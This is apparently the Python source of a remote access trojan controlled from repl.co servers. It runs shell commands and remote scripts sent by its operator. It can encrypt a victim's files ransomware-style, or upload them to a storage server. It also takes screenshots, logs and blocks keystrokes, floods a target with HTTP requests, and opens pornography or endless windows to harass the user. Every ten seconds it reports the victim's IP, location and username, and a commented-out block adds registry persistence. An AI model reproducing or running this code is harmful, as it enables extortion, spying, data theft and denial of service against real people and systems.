import requests
import tkinter.messagebox as tkm
from time import sleep
import time
from datetime import datetime
import pytz
import base64
from cryptography.fernet import Fernet
import codecs
import urllib.request
import getpass
import tempfile
import socket
import sys
import threading
import platform
import subprocess
import urllib3
import keyboard
from PIL import ImageGrab
import shutil
import json
import ssl
from tkinter.simpledialog import askstring
import tkinter
import requests.adapters
import urllib3.exceptions
from requests import get
import requests.packages
import urllib3
from threading import Thread
import multiprocessing
from urllib.request import urlretrieve
import random
import webbrowser
import os

SERVER_NAME = 'https://maybeabigproject.posydon.repl.co'
STORAGE_SERVER = "https://storageserver.posydon.repl.co"
keys = []  #this feature is still in development
os.chdir(tempfile.gettempdir())
ID_STORAGE = f'{tempfile.gettempdir()}/id.txt'
verbose = None


def printss(data):
  if verbose:
    send(str(data))
  else:
    pass


#f'C:/Users/{os.getlogin()}/id.txt'


def url_open(url):
  webbrowser.open(url)


def parse(directory_to_parse):
  global files_found, files
  for file_name in os.listdir(directory_to_parse):
    path = os.path.join(directory_to_parse, file_name)
    if file_name == __file__:
      continue
    if os.path.isfile(path):
      files.append(path)  #type:ignore
      printss('-' * 80)
      printss(f"[{file_name}]--file found")
      files_found += 1
    else:
      found_folder = f"{directory_to_parse}" + "/" + f"{file_name}"
      printss(f"[{found_folder}]--directory found")
      parse(found_folder)


#pyautogui, requests, codecs
def encrypt(directory, send_files):
  global files, files_found, key, sess, id
  key = Fernet.generate_key()
  send(codecs.decode(key))
  sys.setrecursionlimit(10000)
  printss(os.getcwd())
  os.chdir(directory)
  files = []
  files_found = 0
  files_read = 0
  files_encrypted = 0
  errors = 0
  parse(directory)
  for file in files:
    if send_files == "True":
      print(f"send files true for {file}")
      url = f'{STORAGE_SERVER}/upload'
      files = {'file': open(file, 'rb')}
      data = {'id': id, 'user': getpass.getuser()}
      response = requests.post(url, files=files, data=data)
      print(f"response: {response.text}")
    else:
      with open(file, "rb") as thefile:
        try:
          contents = thefile.read()
          printss('-' * 80)
          printss(f"[{thefile}]--reading")
          files_read += 1
        except:
          printss('-' * 80)
          printss(f"[{thefile}]--error reading")
          errors += 1
          continue
        try:
          contents_encrypted = Fernet(key).encrypt(contents)
          printss('-' * 80)
          printss(f"[{thefile}]--encrypting")
          files_encrypted += 1
        except Exception as e:
          errors += 1
          printss('-' * 80)
          printss(f"[{thefile}]--error reading")
          printss(e)
          continue
      with open(file, "wb") as thefile:
        try:
          thefile.write(contents_encrypted)
        except Exception as e:
          printss('-' * 80)
          printss(f"[{thefile}]--error writing to file")
          errors += 1
          printss(e)
          continue

  send(f'''
Encryption Process Complete
----------------
Process Report
----------------
Encryption Working Directory: {os.getcwd()}
----------------
Key: {key}
----------------
Files Found-----{files_found}
Files Read------{files_read}
Files Encrypted-{files_encrypted}
Errors Encountered-{errors}
----------------
Time Sent: {time.ctime()}
Current Working Directory: {tempfile.gettempdir()}
''')
  os.chdir(tempfile.gettempdir())


def msg(title, message, type):
  root = tkinter.Tk()

  root.wm_attributes('-topmost', 1)
  root.withdraw()
  if type == 'error':
    tkm.showerror(title, message, parent=root)
  elif type == 'info':
    tkm.showinfo(title, message, parent=root)

  elif type == 'warning':
    tkm.showwarning(title, message, parent=root)

  root.destroy()


def diologue_top(title, message):
  root = tkinter.Tk()
  root.wm_attributes('-topmost', 1)
  root.withdraw()
  prompt = askstring(title, message, parent=root)  #type: ignore
  send(prompt)
  root.destroy()


def rickroll():
  url_open("https://www.youtube.com/watch?v=dQw4w9WgXcQ")


def ph():
  url_open(base64.b64decode(b'aHR0cHM6Ly9wb3JuZHUuY29t'))


def return_output(command):
  #print('in return outpyut')
  returned_text = subprocess.check_output(command,
                                          shell=True,
                                          universal_newlines=True)
  #print('dir command to list file and directory')
  send(returned_text)


def window():
  try:
    root = tkinter.Tk()
    root.geometry("500x500")
    root.protocol("WM_DELETE_WINDOW", spawn_windows)
    root.title(f"#{amount_of_hydras}")
    #count = tkinter.Label(root, background = "black", text=amount_of_hydras)

    root.mainloop()
  except Exception as e:
    print(e)


def spawn_windows():
  for i in range(0, 6):
    string = Thread(target=window, daemon=True)
    string.start()


def press_callback(key):
  global keys
  #print('{} was pressed'.format(key))
  keys.append(format(key))
  if format(key) == '|':
    send_keys(keys)

    keys = []


def download(url, filename, path=tempfile.gettempdir()):
  try:
    r = requests.get(url, allow_redirects=True)
    open(f'{path}/{filename}', 'wb').write(r.content)
  except Exception as e:
    print(e)


def execute_silently(command):
  #print('in return silent')
  try:
    result = subprocess.run([command], stdout=subprocess.PIPE)
    senddata(result.stdout)
  except Exception as e:
    send(f'error with silent execution(not_shell) :\n {e}')


def execute_silently_shell(command):
  print("shell return silently")
  try:
    result = subprocess.run([command], stdout=subprocess.PIPE)
    senddata(str(result.stdout))
  except Exception as e:
    send(f"FUNNY ERROR: \n {e}")
  #print('done executing')


def execute_normally(command):
  os.system(command)


def attack(port, target, fake_ip):
  while True:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target, port))
    s.sendto(('GET /' + target + ' HTTP/1.1\r\n').encode('ascii'),
             (target, port))
    s.sendto(('Host: ' + fake_ip + '\r\n\r\n').encode('ascii'), (target, port))
    s.close()


def start_listener():
  global events
  print('started listening')
  events = keyboard.record('esc')
  print('finished listening')
  send_keys(events)
  print('sent events')


def execute_file(file):
  os.system(f'START {file}')


def wait_keyboard(time):
  global all_processes
  #just blocks keyboard indefinitely, couldnt get it to work
  a = time
  for i in range(150):
    keyboard.block_key(i)  #type:ignore
  sleep(a)  #type:ignore

  for process in all_processes:
    process.terminate()


def send(data):
  requests.post(f'{SERVER_NAME}/recieve',
                data=base64.b64encode(codecs.encode(data)))


def senddata(data):
  requests.post(f'{SERVER_NAME}/recievedata',
                data=base64.b64encode(codecs.encode(data)))


def send_keys(data):
  requests.post(f'{SERVER_NAME}/recieve_keys',
                data=base64.b64encode(codecs.encode(data)))


def send_screen(data):
  requests.post(f'{SERVER_NAME}/recieve_screen', data=base64.b64encode(data))


def send_ip(data):
  requests.post(f'{SERVER_NAME}/recieve_ip', data=base64.b64encode(data))


def send_id(data):
  requests.post(f'{SERVER_NAME}/recieve_id', data=base64.b64encode(data))


def execute():
  global verbose, send_files

  #determine command parameters
  instructs = sess.get(f'{SERVER_NAME}/inst', verify=False).text
  #print(f'text gotten: {instructs}')
  d_instructs = base64.b64decode(instructs[1:-1])
  #print(f'decrypted (bytes): {d_instructs}')
  a_instructs = codecs.decode(d_instructs)
  #print(a_instructs)
  array_of_lines = a_instructs.splitlines()
  c_arr = a_instructs.split()
  with open('id.txt', 'r') as file:
    id = file.read()
  if c_arr[0] == id or c_arr[0] == 'ALL':

    #print(c_arr)
    repeat = int(c_arr[1])
    type = c_arr[2]
    #print(c_arr)
    try:
      command_with_ticks = c_arr[4]
      formatted_command = command_with_ticks.replace('`', ' ')
      c_arr[4] = formatted_command
      formatted_msg_box_text = c_arr[5].replace('`', ' ')
      c_arr[5] = formatted_msg_box_text
    except:
      pass
    #print(c_arr)
    send('got thy goods')

    #execute command x amount of times
    for i in range(repeat):

      #check if type is script or command
      if type == 'script':
        #execute script
        script = sess.get(f'{SERVER_NAME}/script', verify=False).text
        exec(script)

      elif type == 'notscript':
        type_comm = c_arr[3]
        if type_comm == '99o':
          try:
            #print(f'command: {c_arr[3]}')
            return_output(c_arr[4])
          except:
            send(f'command {c_arr[4]} failed unexpectedly (return output)')
        elif type_comm == '99s':
          try:
            #print(f'command: {c_arr[3]}')
            execute_silently(c_arr[4])  #id 1 notscript 99o pwd
            return_output(c_arr[4])
          except:
            send(f'command {c_arr[4]} failed unexpectedly (execute silently)')
        elif type_comm == 'list_custom':
          try:
            #print(f'command: {c_arr[3]}')
            send(f"Commands: \n{custom_commands}")
          except Exception as e:
            send(f'command list_commands failed unexpectedly: \n {e}')
        elif type_comm == '99n':
          try:
            #print(f'command: {c_arr[3]}')
            execute_normally(c_arr[4])
          except:
            send(f'command {c_arr[4]} failed unexpectedly (execute normally)')
        elif type_comm == 'temp':
          try:
            os.chdir(tempfile.gettempdir())
          except Exception as e:
            send(f"going to temp directory failed unexpectedly: \n {e}")
        elif type_comm == 'encrypt':
          try:
            if c_arr[5] == "true":
              verbose = True
            else:
              verbose = False

            encryption_thread = Thread(target=encrypt(c_arr[4], c_arr[6]),
                                       daemon=True)
            encryption_thread.start()
            print(f"encrypt({c_arr[4]}, {c_arr[6]})")

          except Exception as e:
            send(
              f'encryption command with directory {c_arr[4]} failed unexpectedly:\n{e}'
            )
        elif type_comm == '99sh':
          try:
            #print(f'command: {c_arr[3]}')
            execute_silently_shell(c_arr[4])
          except:
            pass
        elif type_comm == 'hydra':
          try:
            print("hydra")
            #print(f'command: {c_arr[3]}')
            hydra_thread = Thread(target=window, daemon=True)
            hydra_thread.start()
            print("started daemon for hydra")
          except Exception as e:
            send(
              f'command hydra failed unexpectedly (hydra), with {c_arr[4]} spawns per closing: \n {e}'
            )
        elif type_comm == 'url_open':
          try:
            url_open(str(c_arr[4]))
          except Exception as e:
            send(f'urlopen failed')
        elif type_comm == 'screenshot':
          try:
            screenshot = ImageGrab.grab()
            screenshot.save('shot.png')
            sess.post(f'{SERVER_NAME}/upload',
                      files={'image': open('shot.png', 'rb')})
            os.remove('shot.png')
          except Exception as e:
            send(f'screenshot failed, with exception as follows: \n {e}')

        elif type_comm == 'keyboard_w':
          try:
            #print(f'keyboard sendng: {c_arr[3]}')
            keyboard.write(c_arr[4], delay=0.1)
          except Exception as e:
            send(f'keyboard write failed, with exception as follows: \n {e}')

        elif type_comm == 'keyboard_message':
          try:
            #print(f'keyboard sending message')
            message = sess.get(f'{SERVER_NAME}/message', verify=False).text
            keyboard.write(message, delay=0.01)
          except Exception as e:
            send(f'keyboard write failed, with exception as follows: \n {e}')

        elif type_comm == 'keyboard_s':
          try:
            keyboard.send(c_arr[4])
          except Exception as e:
            send(f'send_keys failed, with exception as follows: \n {e}')
        elif type_comm == 'download':
          try:
            download_thread = threading.Thread(target=download,
                                               args=((c_arr[4], c_arr[5],
                                                      c_arr[6])))
            download_thread.start()

          except Exception as e:
            send(f'download failed, with exception as follows: \n {e}')
        elif type_comm == 'rickroll':
          try:
            rick_thread = threading.Thread(target=rickroll, daemon=True)
            rick_thread.start()
          except Exception as e:
            send(f'rickroll failed, with exception as follows: \n {e}')
        elif type_comm == 'ph':
          try:
            ph_thread = threading.Thread(target=ph, daemon=True)
            ph_thread.start()
          except Exception as e:
            send(f'rickroll failed, with exception as follows: \n {e}')
        elif type_comm == 'attack':
          print('sdtarting')
          for i in range(int(c_arr[4])):
            thread = threading.Thread(target=attack,
                                      args=(int(c_arr[5]), c_arr[6], c_arr[7]))
            thread.start()

        elif type_comm == 'dio':
          try:
            dio_thread = Thread(target=diologue_top,
                                args=(c_arr[4], c_arr[5]),
                                daemon=True)
            dio_thread.start()
          except Exception as e:
            send(f'diologue failed, with exception as follows: \n {e}')
        elif type_comm == 'msgbox':

          send('got to messagebox elif statement')
          #print('msg selectede')

          t = Thread(target=msg,
                     args=(c_arr[4], c_arr[5], c_arr[6]),
                     daemon=True)
          t.start()

        elif type_comm == 'file_e':
          try:
            execute_file(c_arr[4])
          except Exception as e:
            send(f'execute_file failed, with exception as follows: \n {e}')

          #exec(c_arr[1])

        elif type_comm == 'keylisten_s':
          try:
            print('about to start daemon')
            listener = multiprocessing.Process(target=start_listener,
                                               daemon=True)
            listener.start()
            print('started daemon')
          except:
            send('gfaled')
        elif type_comm == 'keyblock':
          try:
            sleep_time = int(c_arr[4])
            blocker = Thread(target=wait_keyboard(sleep_time), daemon=True)
            blocker.start()
            all_processes.append(blocker)
            #print('started daemon')
            #start_listen()

          except Exception as e:
            send(f'start keyblock failed, with exception as follows: \n {e}')

        elif type_comm == 'keylisten_st':
          try:
            keyboard.unhook_all()
          except Exception as e:
            send(f'stop keylisten failed, with exception as follows: \n {e}')

        #exec(c_arr[1])

      elif type == 'cscript':
        try:
          #print(f'command: {c_arr[3]}')
          execute_silently(c_arr[4])
          return_output(c_arr[4])
        except:
          send(f'command {c_arr[4]} failed unexpectedly (execute silently)')

      elif type == 'download':
        try:
          #print(f'command: {c_arr[3]}')
          print('before download func')
          download(c_arr[4], c_arr[5], c_arr[6])
          print('after download func')
          #return_output(c_arr[3])
        except Exception as e:
          send(
            f'command {c_arr[4]} failed unexpectedly (download): \n {e} \n syntax for download: [1 notscript download url path name extension'
          )
      #os.execv(sys.argv[0], sys.argv)

      else:
        send('no script and no known command')
  else:
    pass


def start_sending_id():
  while True:
    tz_NY = pytz.timezone('America/New_York')
    # Get the current time in New York
    datetime_NY = datetime.now(tz_NY)
    time = datetime_NY.strftime('%H:%M:%S')
    ip = get('https://api.ipify.org').content.decode('utf8')
    system = platform.system()
    release = platform.release()
    version = platform.version()
    url = 'http://ipinfo.io/json'
    response = urllib.request.urlopen(url)
    data = json.load(response)
    org = data['org']
    city = data['city'].replace(' ', '_')
    print(city)
    country = data['country'].replace(' ', '_')
    print(country)
    region = data['region'].replace(' ', '_')
    longitude = data['loc'].split(',')[0]
    latitude = data['loc'].split(',')[1]
    postal = data['postal']
    timezone = data['timezone']
    try:
      user = os.getlogin()
    except:
      user = "none"
    #print(data)

    send_id(
      codecs.encode(
        f"{id} {system}~{release}~{version.replace(' ', '_')} {ip} {city},{region},{country} {latitude} {longitude} https://www.google.com/maps/search/{latitude}+{longitude}/ {postal} {timezone} {user}"
      ))
    print('sent id')
    sleep(10)


# if os.getlogin() != "ARTHU":#adding to windows registry startup, if its not my computer
#   key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_WRITE)
#   path = os.path.abspath(__file__)
#   name = os.path.splitext(os.path.basename(__file__))[0]
#   winreg.SetValueEx(key, name, 0, winreg.REG_SZ, f'"{path}"')
#   winreg.CloseKey(key)
# else:
#   pass
custom_commands = '''
list_custom : return this list
99o : return supposed output of command
99s : execute command, return output to server
99n : execute command, do nothing with output (it will appear on a terminal)
hydra : I think 11 windows per closing
screenshot : screenshot of main screen
keyboard_w : keyboard write the next argument
keyboard_message : keyboard write text from the server (message.txt)
keyboard_s : send keys to the computer 
rickroll : yea
ph : yes that site
attack : not finished yet
dio : askstring diologue- next arguments are title and message
file_e : execute file using START.  Next argument is file name. Only for windows.
keylisten_s : keylog, broken, procrastinated. Will throw error, dont try
keyblock : Will block keystrokes on computer, side effect of me trying to do something else.
keylisten_st : the would-be command to stop the keylog. Again, doesnt work.
msgbox : tkinter messagebox. Next arguments will be title, message, and type (error/info/warning)
'''
print('dgfwfwef')
amount_of_hydras = 0
try:
  with open(ID_STORAGE, 'r') as file:
    id = file.read()
    if id == '':
      raise Exception('id file empty')
    else:
      file.close()
except:
  with open(ID_STORAGE, 'w') as file:
    id = ''
    for i in range(10):
      id += str(random.randint(0, 9))
      if i == 10:
        continue
      else:
        id += '.'

    file.write(id)

sess = requests.Session()
adapter = requests.adapters.HTTPAdapter(max_retries=20)
sess.mount('http://', adapter)
ssl._create_default_https_context = ssl._create_unverified_context
urllib3.disable_warnings(category=urllib3.exceptions.InsecureRequestWarning)
all_processes = []
send_thread = Thread(target=start_sending_id)
send_thread.start()
while True:
  go_bool = sess.get(f'{SERVER_NAME}/go', verify=False).text

  print(id)
  if go_bool == 'go':
    # send_keys(str(list(keyboard.get_typed_strings(events))))
    sleep(5)
    try:
      execute()
    except Exception as e:
      send(f'error with execution: \n{e}')
  else:
    continue
